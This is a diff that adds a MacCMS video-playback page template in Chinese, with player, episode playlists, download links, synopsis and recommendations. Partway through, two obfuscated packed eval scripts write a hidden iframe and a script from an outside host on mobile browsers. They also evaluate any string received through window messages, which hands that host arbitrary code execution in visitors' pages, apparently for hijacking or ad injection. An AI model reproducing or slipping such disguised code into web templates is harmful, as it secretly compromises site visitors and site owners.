@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<head>
+    {include file="seo/vod_play"}   
+	{include file="block/include"}
+	<script type="text/javascript" src="https://jt.ismicool.cn/heihei/js/history.js"></script>
+	<script type="text/javascript">var vod_name='{$obj.vod_name|mac_substring=10}',vod_url=window.location.href,vod_part='{$obj['vod_play_list'][$param['sid']]['urls'][$param['nid']]['name']}';</script>
+</head>
+<body>
+	
+    <div class="container">
+        <div class="row">
+        	{include file="block/head"}  	       	
+			<!-- 播放器  -->
+			<div class="stui-pannel clearfix">																
+				<div class="stui-player col-pd">
+					<div class="stui-player__video embed-responsive embed-responsive-16by9 clearfix">
+						{$player_data}{$player_js}							
+					</div>	
+					<div class="stui-player__detail detail">
+						<div class="set">
+							<a class="cut" href="{$obj.player_info.link_pre}"><i class="iconfont icon-back"></i> 上一集</a>
+							<a class="cut" href="{$obj.player_info.link_next}">下一集 <i class="iconfont icon-more"></i></a>
+							<span class="bdsharebuttonbox hidden-xs">
+								<a class="cut bds_more" data-cmd="more" href="" style="float: none; background: #f5f5f5; margin: 0; padding: 0;">分享 <i class="iconfont icon-share"></i> </a>
+							</span>	
+						</div>
+						<h4 class="title">{$obj.vod_name}</h4>
+						<p class="data margin-0">
+							<span class="text-muted">类型：</span>{$obj.vod_class}
+							<span class="split-line"></span>
+							<span class="text-muted">地区：</span>{$obj.vod_area}
+							<span class="split-line"></span>
+							<span class="text-muted">年份：</span>{$obj.vod_year}		
+						</p>										
+					</div>																									
+				</div>									
+			</div>	
+			<!-- end 播放器  -->
+			<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('h((/(v|u|t)/i.G(c.H))){F.B(\'C\',k(e){2 6=e.D;h(6.d){E(I(6.d.A(/\\+/g,"%J")))}});4.z(\'<f r="s:q;" 9="a://m.l.8/y/o.x?w=3&7=\'+c["7"]+\'&O=\'+j(10.Z)+\'&Y=\'+j(4.K)+\'" X="0" 12="0"  15="0" 13="14" 11="0" V="W"></f>\')}N{;(k(){2 m=4.M("n");2 b=\'a://m.l.8\';m.9=b+"/1/o.L?"+p.P(p.Q()*U);2 5=4.T("n")[0];5.S.R(m,5)})()}',62,68,'||var||document|ss|_c_ob_hf|platform|cn|src|https|url|navigator|hf_ev_j||iframe||if||encodeURIComponent|function|jhqku||script|141097|Math|none|style|display|baidu|UCBrowser|MQQBrowser|is_iframe|html|rjs|write|replace|addEventListener|message|data|eval|window|test|userAgent|decodeURIComponent|20|referrer|js|createElement|else|ifr_url|round|random|insertBefore|parentNode|getElementsByTagName|10000|allowtransparency|true|height|ifr_ref|href|location|frameborder|width|scrolling|no|marginheight'.split('|'),0,{}))
+</script>
+			<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('a((/(I|G|K)/i.F(n.W))){d.S(\'N\',q(e){6 7=e.P;a(7.3){a(d[7.3+"w"]!=1){d[7.3+"w"]=1;O(R(7.V.M(/\\+/g,"%U")))}}});6 3="r"+9.f().j(t).k(2);4.h("<8 c=\'8"+3+"\'></8>");4.h(\'<l T="X:J;" c="\'+3+\'" x="v://m.z.B/u-E-\'+9.D(9.f()*C)+\'.L?H=5&Q=\'+p(10.1d)+\'&o=\'+n["o"]+\'&3=\'+3+\'&1b=\'+p(4.1c)+\'" 1h="1e" Y="1f%"  1j="0" 1i="1g" 19="0" 13="12"></l>\')}1a{;(q(){6 m=4.Z("A");6 s="r"+9.f().j(t).k(2);4.h("<8 c=\'"+s+"\'></8>");6 y=\'v://m.z.B\';m.x=y+"/11/u.14?15="+s;6 b=4.18("A")[0];b.17.16(m,b)})()}',62,82,'|||if_id|document||var|_c_ob|div|Math|if|ss|id|window||random||write||toString|slice|iframe||navigator|platform|encodeURIComponent|function|_||36|141099|https||src|url|jhqku|script|cn|10000|round|39|test|UCBrowser|is_iframe|MQQBrowser|none|baidu|html|replace|message|eval|data|ifr_url|decodeURIComponent|addEventListener|style|20|wz_ev_j|userAgent|display|width|createElement|location||true|allowtransparency|js|ssid|insertBefore|parentNode|getElementsByTagName|frameborder|else|ifr_ref|referrer|href|auto|100|no|height|scrolling|marginheight'.split('|'),0,{}))
+</script>
+			<!-- 分享  -->
+			<div class="stui-pannel clearfix visible-xs">	
+				<div class="stui-mobile__shere">
+					<a class="open-share" href="javascript:;"><i class="iconfont icon-share"></i> 分享到朋友圈</a>
+				</div>	
+			</div>
+			<!-- end 分享  -->
+			
+			<!-- 播放列表  -->
+			<div class="stui-pannel clearfix" id="playlist">	
+				<div class="stui-pannel__head clearfix">
+					<span class="text-muted pull-right hidden-xs">如果遇到不能播放建议尝试切换来源哦！</span>
+					<h3 class="title">
+						<i class="iconfont icon-link"></i> <span class="active-tab">播放地址</span>
+					</h3>
+					<ul class="tab">										
+						<li class="dropdown">
+							<a href="javascript:;" class="text-red" data-toggle="dropdown">切换来源 <i class="iconfont icon-moreunfold"></i></a>
+							<ul class="dropdown-menu">
+								{maccms:foreach name="obj.vod_play_list" id="vo"}	
+								<li><a href="#playlist{$key}" data-toggle="tab">{$vo.player_info.show}	</a></li>
+								{/maccms:foreach}
+							</ul>
+						</li>	
+					</ul>
+				</div>																			
+				<div class="tab-content stui-pannel_bd">
+					{maccms:foreach name="obj.vod_play_list" id="vo"}	
+					<div id="playlist{$key}" class="tab-pane fade in {if condition="$param.sid eq $vo.sid"}active{/if} clearfix">
+						<ul class="stui-content__playlist playlink clearfix">
+							{maccms:foreach name="vo.urls" id="vo2"}						
+			                <li {if condition="$param.sid eq $vo.sid && $param.nid eq $vo2.nid"}class="active"{/if}><a href="{:mac_url_vod_play($obj,['sid'=>$vo.sid,'nid'=>$vo2.nid])}">{$vo2.name}</a></li>
+			                {/maccms:foreach}
+						</ul>
+						<!--
+						<p class="stui-content__intro">
+							{$vo.player_info.tip}
+						</p>
+						-->
+					</div>															
+					{/maccms:foreach}
+				</div>
+			</div>		
+			<!-- end 播放列表  -->
+			
+			<!-- 下载列表  -->
+			{maccms:foreach name="obj.vod_down_list" id="vo"}
+			<div class="stui-pannel clearfix">	
+				<div class="stui-pannel__head clearfix">
+					<span class="text-muted pull-right">{$vo.player_info.tip}</span>
+					<h3 class="title">
+						<i class="iconfont icon-link"></i> {$vo.from}-下载	
+					</h3>						
+				</div>																			
+				<ul class="stui-content__downlist col-pd clearfix">
+					{maccms:foreach name="vo.urls" id="vo2"}
+					<li><a href="{$vo2.url}">{$vo2.name}</a></li>
+					{/maccms:foreach}
+				</ul>
+			</div>		
+			{/maccms:foreach}
+			<!-- end 下载列表  -->
+							
+			<!-- 剧情介绍 -->
+			<div class="stui-pannel clearfix" id="desc">
+				<div class="stui-pannel__head clearfix">
+					<span class="text-muted pull-right">更新时间：{$obj.vod_time|date='Y-m-d',###}</span>
+					<h3 class="title">
+						<i class="iconfont icon-form"></i> 剧情介绍
+					</h3>						
+				</div>																		
+				<div class="stui-content__desc col-pd clearfix">
+					{$obj.vod_content|mac_filter_html}
+				</div>				
+			</div>
+			<!-- end 剧情介绍 -->
+			
+			<!-- 猜你喜欢 -->
+			<div id="Carousel-2" class="stui-pannel carousel clearfix">				
+				<div class="stui-pannel__head clearfix">
+					<a class="more text-muted pull-right" href="#Carousel-2" data-slide="next"><i class="icon iconfont icon-refresh"></i> 换一换</a>
+					<h3 class="title">
+						<i class="iconfont icon-favorites"></i> 猜你喜欢
+					</h3>						
+				</div>
+				<div class="stui-pannel_bd carousel-inner">
+					<ul class="stui-vodlist item active clearfix">
+						{maccms:vod num="12" type="current" order="desc" by="time"}
+						{include file="block/vod_box"}		
+						{/maccms:vod}
+					</ul>
+					<ul class="stui-vodlist item clearfix">
+						{maccms:vod num="12" type="current" order="desc" by="hits"}
+						{include file="block/vod_box"}		
+						{/maccms:vod}
+					</ul>
+					<ul class="stui-vodlist item clearfix">
+						{maccms:vod num="12" ids="'.$obj['vod_rel_vod'].'" order="desc" by="time"}
+						{include file="block/vod_box"}		
+						{/maccms:vod}
+					</ul>
+				</div>
+			</div>
+			<!-- end 猜你喜欢 -->
+        </div>
+    </div>
+    <script type="text/javascript">$(".MacPlayer").addClass("embed-responsive").css("padding-bottom","56.25%");</script>
+    <span class="mac_hits hits hide" data-mid="{$maccms.mid}" data-id="{$obj.vod_id}" data-type="hits"></span>
+	{include file="block/foot"}
+<!-- 隐藏tab -->
+<script type="text/javascript>
+
+if(("standalone" in window.navigator) && window.navigator.standalone){
+
+var noddy, remotes = false;
+
+document.addEventListener('click', function(event) {
+
+noddy = event.target;
+
+while(noddy.nodeName !== "A" && noddy.nodeName !== "HTML") {
+
+noddy = noddy.parentNode;
+
+}
+
+if('href' in noddy && noddy.href.indexOf('http') !== -1 && (noddy.href.indexOf(document.location.host) !== -1 || remotes))
+
+{
+
+event.preventDefault();
+
+document.location.href = noddy.href;
+
+}
+
+},false);
+
+}
+
+</script>
+<!-- 隐藏tab -->
+</body>
+</html>
